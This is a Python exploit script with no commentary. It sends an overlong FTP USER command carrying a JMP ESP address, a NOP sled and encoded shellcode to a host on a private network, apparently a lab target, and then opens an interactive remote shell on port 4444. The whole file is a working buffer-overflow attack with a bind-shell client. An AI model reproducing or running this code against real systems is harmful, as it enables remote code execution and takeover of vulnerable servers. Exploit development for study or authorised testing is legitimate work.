import socket
import threading
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('192.168.58.135',21))
jmpesp=b'\x9f\x2a\xe1\x77'

shellcode =  b""
shellcode += b"\xdb\xdc\xba\xcf\x4f\x98\xf7\xd9\x74\x24\xf4"
shellcode += b"\x5f\x2b\xc9\xb1\x53\x83\xc7\x04\x31\x57\x13"
shellcode += b"\x03\x98\x5c\x7a\x02\xda\x8b\xf8\xed\x22\x4c"
shellcode += b"\x9d\x64\xc7\x7d\x9d\x13\x8c\x2e\x2d\x57\xc0"
shellcode += b"\xc2\xc6\x35\xf0\x51\xaa\x91\xf7\xd2\x01\xc4"
shellcode += b"\x36\xe2\x3a\x34\x59\x60\x41\x69\xb9\x59\x8a"
shellcode += b"\x7c\xb8\x9e\xf7\x8d\xe8\x77\x73\x23\x1c\xf3"
shellcode += b"\xc9\xf8\x97\x4f\xdf\x78\x44\x07\xde\xa9\xdb"
shellcode += b"\x13\xb9\x69\xda\xf0\xb1\x23\xc4\x15\xff\xfa"
shellcode += b"\x7f\xed\x8b\xfc\xa9\x3f\x73\x52\x94\x8f\x86"
shellcode += b"\xaa\xd1\x28\x79\xd9\x2b\x4b\x04\xda\xe8\x31"
shellcode += b"\xd2\x6f\xea\x92\x91\xc8\xd6\x23\x75\x8e\x9d"
shellcode += b"\x28\x32\xc4\xf9\x2c\xc5\x09\x72\x48\x4e\xac"
shellcode += b"\x54\xd8\x14\x8b\x70\x80\xcf\xb2\x21\x6c\xa1"
shellcode += b"\xcb\x31\xcf\x1e\x6e\x3a\xe2\x4b\x03\x61\x6b"
shellcode += b"\xbf\x2e\x99\x6b\xd7\x39\xea\x59\x78\x92\x64"
shellcode += b"\xd2\xf1\x3c\x73\x15\x28\xf8\xeb\xe8\xd3\xf9"
shellcode += b"\x22\x2f\x87\xa9\x5c\x86\xa8\x21\x9c\x27\x7d"
shellcode += b"\xdf\x94\x8e\x2e\xc2\x59\x70\x9f\x42\xf1\x19"
shellcode += b"\xf5\x4c\x2e\x39\xf6\x86\x47\xd2\x0b\x29\x76"
shellcode += b"\x7f\x85\xcf\x12\x6f\xc3\x58\x8a\x4d\x30\x51"
shellcode += b"\x2d\xad\x12\xc9\xd9\xe6\x74\xce\xe6\xf6\x52"
shellcode += b"\x78\x70\x7d\xb1\xbc\x61\x82\x9c\x94\xf6\x15"
shellcode += b"\x6a\x75\xb5\x84\x6b\x5c\x2d\x24\xf9\x3b\xad"
shellcode += b"\x23\xe2\x93\xfa\x64\xd4\xed\x6e\x99\x4f\x44"
shellcode += b"\x8c\x60\x09\xaf\x14\xbf\xea\x2e\x95\x32\x56"
shellcode += b"\x15\x85\x8a\x57\x11\xf1\x42\x0e\xcf\xaf\x24"
shellcode += b"\xf8\xa1\x19\xff\x57\x68\xcd\x86\x9b\xab\x8b"
shellcode += b"\x86\xf1\x5d\x73\x36\xac\x1b\x8c\xf7\x38\xac"
shellcode += b"\xf5\xe5\xd8\x53\x2c\xae\xf9\xb1\xe4\xdb\x91"
shellcode += b"\x6f\x6d\x66\xfc\x8f\x58\xa5\xf9\x13\x68\x56"
shellcode += b"\xfe\x0c\x19\x53\xba\x8a\xf2\x29\xd3\x7e\xf4"
shellcode += b"\x9e\xd4\xaa"

evil1 = b'A' *2003+jmpesp+b"\x90"*10+shellcode+b'C'*(3000-2003-4-10-len(shellcode))
buffer1=(b"USER "+evil1)
s.send(buffer1)

def recv_loop(sock):
    while True:
        try:
            data = sock.recv(4096)
            if data:
                print(data.decode("gbk", errors="ignore"), end="")
            else:
                time.sleep(0.05)
        except:
            time.sleep(0.05)

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shell.connect(('192.168.58.135', 4444))

t = threading.Thread(target=recv_loop, args=(shell,))
t.daemon = True
t.start()

while True:
    try:
        cmd = input()
        shell.send((cmd + "\r\n").encode("gbk"))
    except KeyboardInterrupt:
        shell.close()
        break
